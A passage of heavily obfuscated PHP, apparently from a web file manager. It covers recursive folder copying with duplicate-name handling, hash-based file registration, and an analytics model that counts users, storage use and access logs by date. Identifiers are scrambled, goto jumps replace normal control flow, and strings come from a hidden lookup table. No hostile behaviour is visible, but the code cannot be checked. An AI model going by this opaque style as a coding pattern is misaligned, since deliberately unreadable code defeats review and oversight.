_copyChildTo($cùñÜ‚¼ë, $bàÂè“äÎÆ, $dÎÂ¹Ÿä¯„, $E„ÒîÀ¦¥Á, &$eìóë‡çï‰, $cèŞƒ²ˆç ) { goto Aó¨÷ÅÏŒØ; e×Ì”Î‹: $E›æ©Ä–Ÿ† = array(); foreach ($AÖ““¯ˆÀ£ as &$D™İ•¾ì¦…) { goto eëïß¼ÇáÒ; eëïß¼ÇáÒ: if (isset($BÍğĞÇŞ™[$D™İ•¾ì¦…[$bÖÌ¯òÁˆï[28]]])) { $D™İ•¾ì¦… = $BÍğĞÇŞ™[$D™İ•¾ì¦…[$bÖÌ¯òÁˆï[28]]]; } $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[403]] = $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[29]] == $bÖÌ¯òÁˆï[77]; $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[405]] = _get($D™İ•¾ì¦…, $bÖÌ¯òÁˆï[168], $bÖÌ¯òÁˆï[33]); goto F¾Ø·øËË; b”ëô‰ğ‹ø: if ($E„ÒîÀ¦¥Á) { $BØÛ¤¹Øó¡ = $this->fileNameExistCache($dÎÂ¹Ÿä¯„, $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[28]]); if ($BØÛ¤¹Øó¡) { if ($D™İ•¾ì¦…[$bÖÌ¯òÁˆï[403]] || $E„ÒîÀ¦¥Á == REPEAT_SKIP) { continue; } if ($E„ÒîÀ¦¥Á == REPEAT_REPLACE) { $DÁº‰×ÑÆ¸ = $this->sourceInfoCache($BØÛ¤¹Øó¡); $d‰ã ß¯‰† = $this->fileHistory($DÁº‰×ÑÆ¸, $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[447]], $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[78]]); if ($d‰ã ß¯‰†) { $eìóë‡çï‰[$bÖÌ¯òÁˆï[542]][] = $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[447]]; } continue; } else { if ($E„ÒîÀ¦¥Á == REPEAT_RENAME) { $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[28]] = $this->fileNameAutoCache($dÎÂ¹Ÿä¯„, $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[28]], $E„ÒîÀ¦¥Á, !1); } } } } if (!$D™İ•¾ì¦…[$bÖÌ¯òÁˆï[403]] && $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[447]]) { $eìóë‡çï‰[$bÖÌ¯òÁˆï[542]][] = $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[447]]; } $E›æ©Ä–Ÿ†[] = $this->_makeItemData($D™İ•¾ì¦…, $E¬¹ˆÓÑìã, $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[28]]); goto bø‡Ò•¿»; F¾Ø·øËË: $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[78]] = _get($D™İ•¾ì¦…, $bÖÌ¯òÁˆï[78], 0); $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[447]] = _get($D™İ•¾ì¦…, $bÖÌ¯òÁˆï[447], 0); if (!isset($D™İ•¾ì¦…[$bÖÌ¯òÁˆï[581]]) && $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[447]]) { $eìóë‡çï‰[$bÖÌ¯òÁˆï[578]][] = $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[447]]; } goto b”ëô‰ğ‹ø; bø‡Ò•¿»: } unset($D™İ•¾ì¦…); goto cäÏ¬¾âßé; EŞãÇ““ù: $AÓãÓÀ„Êì = $AÓãÓÀ„Êì ? $AÓãÓÀ„Êì : array($bÖÌ¯òÁˆï[74] => array(), $bÖÌ¯òÁˆï[75] => array()); $AÖ““¯ˆÀ£ = array_merge($AÓãÓÀ„Êì[$bÖÌ¯òÁˆï[74]], $AÓãÓÀ„Êì[$bÖÌ¯òÁˆï[75]]); $BÍğĞÇŞ™ = $this->_addFiles($cùñÜ‚¼ë, $AÓãÓÀ„Êì[$bÖÌ¯òÁˆï[74]], $cèŞƒ²ˆç ); goto e×Ì”Î‹; cäÏ¬¾âßé: if (!empty($E›æ©Ä–Ÿ†)) { $this->addAll($E›æ©Ä–Ÿ†); $this->_childrenListSelect($dÎÂ¹Ÿä¯„); } $EÖ˜õ¼Ú‘š = $this->_childrenList($dÎÂ¹Ÿä¯„); $EÖ˜õ¼Ú‘š = array_to_keyvalue($EÖ˜õ¼Ú‘š, $bÖÌ¯òÁˆï[28]); goto a„ Æ‰ê¡­; a„ Æ‰ê¡­: foreach ($AÖ““¯ˆÀ£ as $D™İ•¾ì¦…) { $DÁº‰×ÑÆ¸ = $EÖ˜õ¼Ú‘š[$D™İ•¾ì¦…[$bÖÌ¯òÁˆï[28]]]; $A¼Éƒ„“ï = $DÁº‰×ÑÆ¸[$bÖÌ¯òÁˆï[395]]; $this->_copyApplyMeta($DÁº‰×ÑÆ¸, $eìóë‡çï‰); if ($D™İ•¾ì¦…[$bÖÌ¯òÁˆï[29]] == $bÖÌ¯òÁˆï[77]) { $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[76]] = $cùñÜ‚¼ë->getPathInner($D™İ•¾ì¦…[$bÖÌ¯òÁˆï[76]]); $this->_copyChildTo($cùñÜ‚¼ë, $D™İ•¾ì¦…[$bÖÌ¯òÁˆï[76]], $A¼Éƒ„“ï, $E„ÒîÀ¦¥Á, $eìóë‡çï‰, $cèŞƒ²ˆç ); } } goto aêÅÙĞø•²; Aó¨÷ÅÏŒØ: $bÖÌ¯òÁˆï =& $_SERVER[ä°„ä°º]; $E¬¹ˆÓÑìã = $this->sourceInfoCache($dÎÂ¹Ÿä¯„); $AÓãÓÀ„Êì = $cùñÜ‚¼ë->listPath($bàÂè“äÎÆ); goto EŞãÇ““ù; aêÅÙĞø•²: } private function _addFiles($F°«ÑÇİŒâ, $dœàğã·ô©, $aĞ¶æšÇ¯£) { goto dİË¶òÅ–; dİË¶òÅ–: $CçÆ“‘–¯ˆ =& $_SERVER[ä°„ä°º]; if (!$dœàğã·ô© || count($dœàğã·ô©) == 0) { return array(); } $bÕ‰¾ÇÌÒ = array(); goto FÒ¾ËÚÒ¶Ñ; aÈÁƒƒ¶ã: foreach ($eñÆ¹—¿„È as $f¹ˆ…Ú÷‹) { if (!isset($bÕ‰¾ÇÌÒ[$f¹ˆ…Ú÷‹[$CçÆ“‘–¯ˆ[170]]])) { continue; } $Cë¬Ö…³÷º = $bÕ‰¾ÇÌÒ[$f¹ˆ…Ú÷‹[$CçÆ“‘–¯ˆ[170]]]; foreach ($Cë¬Ö…³÷º as &$bãìÅ¼İÄ½) { $bãìÅ¼İÄ½[$CçÆ“‘–¯ˆ[447]] = $f¹ˆ…Ú÷‹[$CçÆ“‘–¯ˆ[447]]; $bãìÅ¼İÄ½[$CçÆ“‘–¯ˆ[581]] = !0; } unset($bãìÅ¼İÄ½); } $C´®¨íÈ‚ˆ = array(); foreach ($dœàğã·ô© as $b§Ğ³¿­¦Ü) { if (isset($b§Ğ³¿­¦Ü[$CçÆ“‘–¯ˆ[581]]) && $b§Ğ³¿­¦Ü[$CçÆ“‘–¯ˆ[581]]) { continue; } $DóŒàí°ö÷ = $F°«ÑÇİŒâ->getPathInner($b§Ğ³¿­¦Ü[$CçÆ“‘–¯ˆ[76]]); $aòåøĞª’– = $e°îĞÑ‡Íì->addFileMake($DóŒàí°ö÷, $b§Ğ³¿­¦Ü[$CçÆ“‘–¯ˆ[78]], $b§Ğ³¿­¦Ü[$CçÆ“‘–¯ˆ[171]], $b§Ğ³¿­¦Ü[$CçÆ“‘–¯ˆ[170]], $b§Ğ³¿­¦Ü[$CçÆ“‘–¯ˆ[28]], $aĞ¶æšÇ¯£); $C´®¨íÈ‚ˆ[] = $aòåøĞª’–; } goto FÜºÊä„Äª; F·Ú¶ÌÆ›: $eñÆ¹—¿„È = $eñÆ¹—¿„È ? $eñÆ¹—¿„È : array(); foreach ($eñÆ¹—¿„È as $f¹ˆ…Ú÷‹) { if (!isset($bÕ‰¾ÇÌÒ[$f¹ˆ…Ú÷‹[$CçÆ“‘–¯ˆ[170]]])) { continue; } $c…¹Îˆò†± =& $bÕ‰¾ÇÌÒ[$f¹ˆ…Ú÷‹[$CçÆ“‘–¯ˆ[170]]]; foreach ($c…¹Îˆò†± as &$bãìÅ¼İÄ½) { $bãìÅ¼İÄ½[$CçÆ“‘–¯ˆ[447]] = $f¹ˆ…Ú÷‹[$CçÆ“‘–¯ˆ[447]]; } unset($bãìÅ¼İÄ½); } $dãêËèÜÁ = array(); goto cˆ‡ğ¬’Ã; FÜºÊä„Äª: $e°îĞÑ‡Íì->addAll($C´®¨íÈ‚ˆ); $Cò³™‡Ïò = array($CçÆ“‘–¯ˆ[170] => array($CçÆ“‘–¯ˆ[7], array_keys($bÕ‰¾ÇÌÒ))); $eñÆ¹—¿„È = $e°îĞÑ‡Íì->where($Cò³™‡Ïò)->select(); goto F·Ú¶ÌÆ›; FÒ¾ËÚÒ¶Ñ: foreach ($dœàğã·ô© as &$bãìÅ¼İÄ½) { goto bÆÛëö‘ó; F¸­¶Â¢†¡: $B¢ŠÄ‚ˆ½ = $F°«ÑÇİŒâ->hashMd5($bãìÅ¼İÄ½[$CçÆ“‘–¯ˆ[76]]); if (strlen($B¢ŠÄ‚ˆ½) > 10 && !isset($bÕ‰¾ÇÌÒ[$B¢ŠÄ‚ˆ½])) { $bÕ‰¾ÇÌÒ[$B¢ŠÄ‚ˆ½] = array(); } $bãìÅ¼İÄ½[$CçÆ“‘–¯ˆ[171]] = $eŒŒæ¹’î©; goto D´Øƒ‚®­ª; bÆÛëö‘ó: Hook::trigger($CçÆ“‘–¯ˆ[582], $bãìÅ¼İÄ½); $bãìÅ¼İÄ½[$CçÆ“‘–¯ˆ[76]] = $F°«ÑÇİŒâ->getPathInner($bãìÅ¼İÄ½[$CçÆ“‘–¯ˆ[76]]); $eŒŒæ¹’î© = $F°«ÑÇİŒâ->hashSimple($bãìÅ¼İÄ½[$CçÆ“‘–¯ˆ[76]]); goto F¸­¶Â¢†¡; D´Øƒ‚®­ª: $bãìÅ¼İÄ½[$CçÆ“‘–¯ˆ[170]] = $B¢ŠÄ‚ˆ½; Hook::trigger($CçÆ“‘–¯ˆ[583], $bãìÅ¼İÄ½); $bÕ‰¾ÇÌÒ[$B¢ŠÄ‚ˆ½][] =& $bãìÅ¼İÄ½; goto A˜—Œö¹œ; A˜—Œö¹œ: if (count($bÕ‰¾ÇÌÒ[$B¢ŠÄ‚ˆ½]) > 1) { $bãìÅ¼İÄ½[$CçÆ“‘–¯ˆ[581]] = !0; } goto A¶ò„ÆÙ¸­; A¶ò„ÆÙ¸­: } unset($bãìÅ¼İÄ½); $Cò³™‡Ïò = array($CçÆ“‘–¯ˆ[170] => array($CçÆ“‘–¯ˆ[7], array_keys($bÕ‰¾ÇÌÒ))); goto eáàé‹­ˆ¹; cˆ‡ğ¬’Ã: foreach ($dœàğã·ô© as $CÒŠÛÚ¾°ô) { $dãêËèÜÁ[$CÒŠÛÚ¾°ô[$CçÆ“‘–¯ˆ[28]]] = $CÒŠÛÚ¾°ô; } return $dãêËèÜÁ; goto CÇô´˜ˆ˜£; eáàé‹­ˆ¹: $e°îĞÑ‡Íì = Model($CçÆ“‘–¯ˆ[584]); $eñÆ¹—¿„È = $e°îĞÑ‡Íì->where($Cò³™‡Ïò)->select(); $eñÆ¹—¿„È = $eñÆ¹—¿„È ? $eñÆ¹—¿„È : array(); goto aÈÁƒƒ¶ã; CÇô´˜ˆ˜£: } } define($_SERVER[ä°„ä°º][585], $_SERVER[ä°„ä°º][586]); goto eÑÎôö®˜; d°†øßï»˜: class AnalysisModel extends ModelBaseLight { public function init($D¢ªŒÎåğ) { $E°Ó‡»­Î• =& $_SERVER[ä°„ä°º]; $C…©å¨¿ÍÃ = array($E°Ó‡»­Î•[575] => array($E°Ó‡»­Î•[29] => $E°Ó‡»­Î•[1646], $E°Ó‡»­Î•[271] => array($E°Ó‡»­Î•[222], $E°Ó‡»­Î•[748], $E°Ó‡»­Î•[1647], $E°Ó‡»­Î•[1648])), $E°Ó‡»­Î•[1649] => array($E°Ó‡»­Î•[29] => $E°Ó‡»­Î•[1650], $E°Ó‡»­Î•[271] => array($E°Ó‡»­Î•[222], $E°Ó‡»­Î•[746], $E°Ó‡»­Î•[1651], $E°Ó‡»­Î•[1652], $E°Ó‡»­Î•[1653]))); if (!isset($C…©å¨¿ÍÃ[$D¢ªŒÎåğ])) { return !1; } $this->optionType = $C…©å¨¿ÍÃ[$D¢ªŒÎåğ][$E°Ó‡»­Î•[29]]; $this->field = $C…©å¨¿ÍÃ[$D¢ªŒÎåğ][$E°Ó‡»­Î•[271]]; return !0; } public function listData($E×¾’„—ß‘ = false, $c¦¡ê…Ê©Œ = "\x6d\x6f\144\151\x66\x79\124\x69\155\x65", $bà¦îö§‰Ñ = false) { return parent::listData($E×¾’„—ß‘, $c¦¡ê…Ê©Œ, $bà¦îö§‰Ñ); } public function trendList($fƒùà¢ÆîÃ) { goto c¯ŞŞÏË; f‰ª™´ƒ„: if (!isset($bˆóö¡ğó)) { $b¿Öğ„¯¦ë = $fƒùà¢ÆîÃ == $BòŠİˆÖßÈ[575] ? $BòŠİˆÖßÈ[519] : $BòŠİˆÖßÈ[813]; $bˆóö¡ğó = Model($b¿Öğ„¯¦ë)->min($BòŠİˆÖßÈ[194]); } $d›À±àé™ö = $BòŠİˆÖßÈ[1656] . ucfirst($fƒùà¢ÆîÃ); $f½ˆŞá„øÌ = $this->dateList($bˆóö¡ğó); goto Eƒğ˜Ñ•Ê; c¯ŞŞÏË: $BòŠİˆÖßÈ =& $_SERVER[ä°„ä°º]; $b…‹òÈ â¸ = $this->listData(); if ($b…‹òÈ â¸) { $EØ¿ß‘ƒç = end($b…‹òÈ â¸); $a¨õŸÂø•± = date($BòŠİˆÖßÈ[1654], strtotime($BòŠİˆÖßÈ[1655])); if ($EØ¿ß‘ƒç[$BòŠİˆÖßÈ[222]] == $a¨õŸÂø•±) { return $b…‹òÈ â¸; } $bˆóö¡ğó = strtotime($EØ¿ß‘ƒç[$BòŠİˆÖßÈ[222]]); } goto f‰ª™´ƒ„; Eƒğ˜Ñ•Ê: foreach ($f½ˆŞá„øÌ as $a¨õŸÂø•±) { $this->{$d›À±àé™ö}($a¨õŸÂø•±); } return $this->listData(); goto B¢Ó‹ãáÁ; B¢Ó‹ãáÁ: } private function dateList($FÄ‹¡ÎÌ) { $b¥š’½™ÎÕ =& $_SERVER[ä°„ä°º]; $eˆ—ê«ù•ã = $FÄ‹¡ÎÌ; $eÖ×ß¢–Û² = strtotime($b¥š’½™ÎÕ[1655]); $Bœ‚Ë“¢ñ  = array(); while ($eˆ—ê«ù•ã <= $eÖ×ß¢–Û²) { $Bœ‚Ë“¢ñ [] = date($b¥š’½™ÎÕ[1654], $eˆ—ê«ù•ã); $eˆ—ê«ù•ã = strtotime($b¥š’½™ÎÕ[1657], $eˆ—ê«ù•ã); } return $Bœ‚Ë“¢ñ ; } public function _recordUser($b¸„Ÿ‰Ï†¹ = '') { goto Fò¬·‚º¿; f˜ÁŞ¸¯¾­: $eõ‹§­Ú¡À = Model($fÄ¼“·äç‰[519])->where($B¥å«•‡¢á)->count($fÄ¼“·äç‰[1551]); $B¥å«•‡¢á[$fÄ¼“·äç‰[29]] = $fÄ¼“·äç‰[1660]; $c³†»Ş¢ç = Model($fÄ¼“·äç‰[1661])->where($B¥å«•‡¢á)->count($fÄ¼“·äç‰[1662]); goto fÃ•¸âè; fÃ•¸âè: $cÛâÒ“‡ôÎ = array($fÄ¼“·äç‰[222] => $b¸„Ÿ‰Ï†¹, $fÄ¼“·äç‰[748] => (int) $A‘ï«Üß³Ì, $fÄ¼“·äç‰[1647] => (int) $eõ‹§­Ú¡À, $fÄ¼“·äç‰[1648] => (int) $c³†»Ş¢ç); return $this->insert($cÛâÒ“‡ôÎ); goto dëÅÀ—Ã¦; Fò¬·‚º¿: $fÄ¼“·äç‰ =& $_SERVER[ä°„ä°º]; $FåÓ½“ÇŒ¨ = strtotime(date($fÄ¼“·äç‰[1658], strtotime($b¸„Ÿ‰Ï†¹))); $fŠ‚Í²ø·à = strtotime(date($fÄ¼“·äç‰[1659], strtotime($b¸„Ÿ‰Ï†¹))); goto A†®É¾©©¯; A†®É¾©©¯: $B¥å«•‡¢á = array($fÄ¼“·äç‰[194] => array($fÄ¼“·äç‰[992], $fŠ‚Í²ø·à)); $A‘ï«Üß³Ì = Model($fÄ¼“·äç‰[519])->where($B¥å«•‡¢á)->count($fÄ¼“·äç‰[1551]); $B¥å«•‡¢á[$fÄ¼“·äç‰[194]] = array($fÄ¼“·äç‰[331], array($FåÓ½“ÇŒ¨, $fŠ‚Í²ø·à)); goto f˜ÁŞ¸¯¾­; dëÅÀ—Ã¦: } public function _recordStore($E›Ÿ“©¢Óù = '') { goto fœõØÈëŞÆ; Eæ„‚¡÷±: $dÔÙé¿¯‹ = Model($c†¥¶‘¶„[813])->where($dõë¤Î­)->sum($c†¥¶‘¶„[78]); $AÚâ¢Ú¹¦ = array($c†¥¶‘¶„[222] => $E›Ÿ“©¢Óù, $c†¥¶‘¶„[746] => (int) $b¶µœĞ½È‹, $c†¥¶‘¶„[1651] => (int) $CœÌõ˜åŞ, $c†¥¶‘¶„[1652] => (int) $c§©„Ö¬†Ò, $c†¥¶‘¶„[1653] => (int) $dÔÙé¿¯‹); return $this->insert($AÚâ¢Ú¹¦); goto B¼™ŞÀ•ßˆ; fœõØÈëŞÆ: $c†¥¶‘¶„ =& $_SERVER[ä°„ä°º]; $d’œ£Şé„õ = strtotime(date($c†¥¶‘¶„[1659], strtotime($E›Ÿ“©¢Óù))); $dõë¤Î­ = array($c†¥¶‘¶„[194] => array($c†¥¶‘¶„[992], $d’œ£Şé„õ)); goto f¼îğ‰ë¤Ñ; d«áî›íÑ: $dõë¤Î­[$c†¥¶‘¶„[404]] = 1; $c§©„Ö¬†Ò = Model($c†¥¶‘¶„[813])->where($dõë¤Î­)->sum($c†¥¶‘¶„[78]); $dõë¤Î­[$c†¥¶‘¶„[404]] = 2; goto Eæ„‚¡÷±; f¼îğ‰ë¤Ñ: $CœÌõ˜åŞ = Model($c†¥¶‘¶„[450])->where($dõë¤Î­)->sum($c†¥¶‘¶„[78]); $dõë¤Î­[$c†¥¶‘¶„[403]] = 0; $b¶µœĞ½È‹ = Model($c†¥¶‘¶„[813])->where($dõë¤Î­)->sum($c†¥¶‘¶„[78]); goto d«áî›íÑ; B¼™ŞÀ•ßˆ: } public function trend($D°Çéãğá, $C­“ìµ–) { goto D…«áİæŸ‘; F‚¹ºÁ£ö: return $eĞçã‚ºÅº; goto B…»Ş’äÊÜ; D§Æäî×›: if ($BÉ÷‘ù©†Ù && $C­“ìµ– != $dÄÑ™¹Äë[1524]) { $cÇì¸ÃêİË = $BÉ÷‘ù©†Ù[0][$dÄÑ™¹Äë[222]]; $DåìÔŠà‹Ï = $this->validDate($C­“ìµ–, $cÇì¸ÃêİË); $C‰»ÀªÜÁ = array(); $dÚ¤ÆøõÌ’ = array_to_keyvalue($BÉ÷‘ù©†Ù, $dÄÑ™¹Äë[222]); foreach ($DåìÔŠà‹Ï as $E†…‚÷Ş×½) { if (isset($dÚ¤ÆøõÌ’[$E†…‚÷Ş×½])) { $A¸¤êšàÅ = $dÚ¤ÆøõÌ’[$E†…‚÷Ş×½]; } else { $A¸¤êšàÅ = end($BÉ÷‘ù©†Ù); $A¸¤êšàÅ[$dÄÑ™¹Äë[222]] = $E†…‚÷Ş×½; if ($D°Çéãğá == $dÄÑ™¹Äë[575]) { $A¸¤êšàÅ[$dÄÑ™¹Äë[1647]] = $A¸¤êšàÅ[$dÄÑ™¹Äë[1648]] = 0; } } $C‰»ÀªÜÁ[] = $A¸¤êšàÅ; } $BÉ÷‘ù©†Ù = $C‰»ÀªÜÁ; } $EÖ‹èñ‹ã = array($dÄÑ™¹Äë[575] => array($dÄÑ™¹Äë[748] => LNG($dÄÑ™¹Äë[1663]), $dÄÑ™¹Äë[1647] => LNG($dÄÑ™¹Äë[1664]), $dÄÑ™¹Äë[1648] => LNG($dÄÑ™¹Äë[1665])), $dÄÑ™¹Äë[1649] => array($dÄÑ™¹Äë[746] => LNG($dÄÑ™¹Äë[1666]), $dÄÑ™¹Äë[1651] => LNG($dÄÑ™¹Äë[1667]), $dÄÑ™¹Äë[1652] => LNG($dÄÑ™¹Äë[1668]), $dÄÑ™¹Äë[1653] => LNG($dÄÑ™¹Äë[1669]))); $fÛğä‰Ï”‹ = array($dÄÑ™¹Äë[575] => $dÄÑ™¹Äë[1670], $dÄÑ™¹Äë[1649] => $dÄÑ™¹Äë[78]); goto eÇ†‹–©ÒÑ; D…«áİæŸ‘: $dÄÑ™¹Äë =& $_SERVER[ä°„ä°º]; if (!$this->init($D°Çéãğá)) { return !1; } $BÉ÷‘ù©†Ù = $this->trendList($D°Çéãğá); goto D§Æäî×›; eÇ†‹–©ÒÑ: if (empty($BÉ÷‘ù©†Ù)) { $E†…‚÷Ş×½ = date($dÄÑ™¹Äë[1654], strtotime($dÄÑ™¹Äë[1655])); $aœ×ÏèŠ¥Ğ = array($dÄÑ™¹Äë[222] => $E†…‚÷Ş×½); foreach ($EÖ‹èñ‹ã[$D°Çéãğá] as $f‚î…òŠ»¶ => $EÓ‰İ¿Ğ¶) { $aœ×ÏèŠ¥Ğ[$f‚î…òŠ»¶] = 0; } $BÉ÷‘ù©†Ù[] = $aœ×ÏèŠ¥Ğ; } $eĞçã‚ºÅº = array(); foreach ($BÉ÷‘ù©†Ù as $EÓ‰İ¿Ğ¶) { if ($D°Çéãğá == $dÄÑ™¹Äë[1649] && $EÓ‰İ¿Ğ¶[$dÄÑ™¹Äë[1651]] > $EÓ‰İ¿Ğ¶[$dÄÑ™¹Äë[746]]) { $EÓ‰İ¿Ğ¶[$dÄÑ™¹Äë[1651]] = $EÓ‰İ¿Ğ¶[$dÄÑ™¹Äë[746]]; } foreach ($EÖ‹èñ‹ã[$D°Çéãğá] as $f‚î…òŠ»¶ => $e§ÚÁ¶©‰†) { $A¸¤êšàÅ = array($dÄÑ™¹Äë[222] => $EÓ‰İ¿Ğ¶[$dÄÑ™¹Äë[222]], $dÄÑ™¹Äë[1454] => $e§ÚÁ¶©‰†); $A¸¤êšàÅ[$fÛğä‰Ï”‹[$D°Çéãğá]] = isset($EÓ‰İ¿Ğ¶[$f‚î…òŠ»¶]) ? $EÓ‰İ¿Ğ¶[$f‚î…òŠ»¶] : 0; $eĞçã‚ºÅº[] = $A¸¤êšàÅ; } } goto F‚¹ºÁ£ö; B…»Ş’äÊÜ: } public function validDate($cÆïŠÕĞìÈ, $dìİ©²À´–) { goto CÈ•å‚§æ©; CÈ•å‚§æ©: $d¾¿„¾÷Ô” =& $_SERVER[ä°„ä°º]; $fÚ®œŠ™Û¹ = date($d¾¿„¾÷Ô”[1654], strtotime($d¾¿„¾÷Ô”[1655])); $aäòÏìğ’Õ = array($fÚ®œŠ™Û¹); goto f“‚›ÕµÏÀ; f“‚›ÕµÏÀ: switch ($cÆïŠÕĞìÈ) { case $d¾¿„¾÷Ô”[1531]: $e§Õ›§øÓŠ = mktime(0, 0, 0, date($d¾¿„¾÷Ô”[1671]), date($d¾¿„¾÷Ô”[1274]) - date($d¾¿„¾÷Ô”[1335]) + 7 - 7, date($d¾¿„¾÷Ô”[1672])); $DØÎåƒ‡¨ç = 0; do { $c¬ì‹¨‚œñ = date($d¾¿„¾÷Ô”[1654], $e§Õ›§øÓŠ - 3600 * 24 * 7 * $DØÎåƒ‡¨ç); $aäòÏìğ’Õ[] = $c¬ì‹¨‚œñ; $DØÎåƒ‡¨ç++; } while ($dìİ©²À´– < $c¬ì‹¨‚œñ); break; case $d¾¿„¾÷Ô”[1529]: $DØÎåƒ‡¨ç = 1; do { $BŒÖ£ìÚ·ì = date($d¾¿„¾÷Ô”[1673], strtotime("\x2d\x20{$DØÎåƒ‡¨ç}\x20\x6d\x6f\x6e\164\150\163")); $aäòÏìğ’Õ[] = $BŒÖ£ìÚ·ì; $DØÎåƒ‡¨ç++; } while ($dìİ©²À´– < $BŒÖ£ìÚ·ì); break; case $d¾¿„¾÷Ô”[1674]: $bÔİÈ™ƒ†À = (int) date($d¾¿„¾÷Ô”[1672], strtotime($dìİ©²À´–)); $C§ĞÉæÂ° = (int) date($d¾¿„¾÷Ô”[1672]); if ($bÔİÈ™ƒ†À >= $C§ĞÉæÂ°) { break; } for ($bÔİÈ™ƒ†À; $bÔİÈ™ƒ†À < $C§ĞÉæÂ°; $bÔİÈ™ƒ†À++) { $aäòÏìğ’Õ[] = $bÔİÈ™ƒ†À . $d¾¿„¾÷Ô”[1675]; } break; default: break; } if ($dìİ©²À´– > end($aäòÏìğ’Õ)) { array_pop($aäòÏìğ’Õ); } sort($aäòÏìğ’Õ); goto bÌì“•Ò; bÌì“•Ò: return $aäòÏìğ’Õ; goto c‹òŸ¡åÍØ; c‹òŸ¡åÍØ: } public function listTable($Dš ™İ‡¨¢) { $fè†°Í‘Ï = ucfirst($Dš ™İ‡¨¢); return Model($fè†°Í‘Ï)->listData(); } public function option($bšéÛƒ¿éŸ) { $dƒæ©¦‰õœ = $_SERVER[ä°„ä°º][1676] . ucfirst($bšéÛƒ¿éŸ); return $this->{$dƒæ©¦‰õœ}(); } private function optionUser() { goto CçØÉôŒ©; DºÌøÓçáÛ: if (!$bÕÎí¦Œ…”) { $bÕÎí¦Œ…” = 1; } $fÙêÏÆºˆ = array($a¨ºŒÕÂê™[1678] => array($a¨ºŒÕÂê™[993], $F¬Æøİè)); $bÃ“‰ÀŸä = Model($a¨ºŒÕÂê™[519])->where($fÙêÏÆºˆ)->count($a¨ºŒÕÂê™[1551]); goto DñÒŠã‡‹ß; FªÓ¸×¸¨: if ($C¢ì«Ğ¾œã < $F¬Æøİè) { $C¢ì«Ğ¾œã = $F¬Æøİè; } $fÙêÏÆºˆ = array($a¨ºŒÕÂê™[1678] => array($a¨ºŒÕÂê™[993], $C¢ì«Ğ¾œã)); $bÕÎí¦Œ…” = (int) Model($a¨ºŒÕÂê™[519])->where($fÙêÏÆºˆ)->count($a¨ºŒÕÂê™[1551]); goto DºÌøÓçáÛ; DñÒŠã‡‹ß: return array($a¨ºŒÕÂê™[742] => (int) $aš±§é¤ß·, $a¨ºŒÕÂê™[1679] => (int) ($aš±§é¤ß· - $DğÊ¢¢áõ), $a¨ºŒÕÂê™[1680] => (int) $DğÊ¢¢áõ, $a¨ºŒÕÂê™[1681] => (int) $bÃ“‰ÀŸä, $a¨ºŒÕÂê™[1682] => $bÕÎí¦Œ…”); goto E˜ï‹ÕèÒ¼; eµ¾ÅÊ“Šò: $dá­ ¾½† = intval($GLOBALS[$a¨ºŒÕÂê™[6]][$a¨ºŒÕÂê™[347]][$a¨ºŒÕÂê™[1510]]) / 3600; $C¢ì«Ğ¾œã = strtotime("\55{$dá­ ¾½†}\40\150\x6f\165\x72\163"); $F¬Æøİè = strtotime(date($a¨ºŒÕÂê™[1658])); goto FªÓ¸×¸¨; CçØÉôŒ©: $a¨ºŒÕÂê™ =& $_SERVER[ä°„ä°º]; $aš±§é¤ß· = Model($a¨ºŒÕÂê™[519])->count($a¨ºŒÕÂê™[1551]); $DğÊ¢¢áõ = Model($a¨ºŒÕÂê™[519])->where($a¨ºŒÕÂê™[1677])->count($a¨ºŒÕÂê™[1551]); goto eµ¾ÅÊ“Šò; E˜ï‹ÕèÒ¼: } private function optionFile() { goto Eìµ¹í–ÔÉ; Eìµ¹í–ÔÉ: $a„ñáÖïë =& $_SERVER[ä°„ä°º]; $cªè›°»ñê = $this->sourceSize(); $C™†•¸¶Ú· = $cªè›°»ñê[$a„ñáÖïë[78]]; goto aŞ‚’ìèê; còÜÚãã‹Í: $fí–«„ŒùÊ = Model($a„ñáÖïë[813])->where($b™–¢‘ğèÂ)->sum($a„ñáÖïë[78]); $a½Ê¸õ¬ò‘ = Model($a„ñáÖïë[813])->where($b™–¢‘ğèÂ)->count($a„ñáÖïë[395]); return array($a„ñáÖïë[746] => $C™†•¸¶Ú·, $a„ñáÖïë[1651] => $a£ä”‚İ³Û, $a„ñáÖïë[1683] => $C™†•¸¶Ú· - $a£ä”‚İ³Û, $a„ñáÖïë[1684] => (int) $fí–«„ŒùÊ, $a„ñáÖïë[748] => (int) $bÈğÕ¨ßÑ, $a„ñáÖïë[1685] => (int) $a½Ê¸õ¬ò‘); goto b¶„Âğ¿è; aŞ‚’ìèê: $a£ä”‚İ³Û = $cªè›°»ñê[$a„ñáÖïë[1651]]; $bÈğÕ¨ßÑ = Model($a„ñáÖïë[813])->where(array($a„ñáÖïë[403] => 0))->count($a„ñáÖïë[395]); $b™–¢‘ğèÂ = array($a„ñáÖïë[403] => 0, $a„ñáÖïë[194] => array($a„ñáÖïë[993], strtotime(date($a„ñáÖïë[1658])))); goto còÜÚãã‹Í; b¶„Âğ¿è: } private function optionAccess() { $D’Ö…ø« =& $_SERVER[ä°„ä°º]; return array($D’Ö…ø«[742] => $this->typeLogCnt(), $D’Ö…ø«[107] => $this->typeLogCnt($D’Ö…ø«[107]), $D’Ö…ø«[430] => $this->typeLogCnt($D’Ö…ø«[430]), $D’Ö…ø«[1686] => $this->typeLogCnt($D’Ö…ø«[1686]), $D’Ö…ø«[1687] => $this->typeLogCnt($D’Ö…ø«[1687]), $D’Ö…ø«[575] => $this->typeLogCnt($D’Ö…ø«[33], $D’Ö…ø«[1662])); } private function typeLogCnt($aÕøšÆÈØ¹ = '', $EèÑ©‰’¾ö = "\151\144") { goto C× ¥³ˆ·æ; F‘¦Ç·óêí: $FĞ‘õİ¡ßí = array($eµ‹§ùÇÃ[194] => 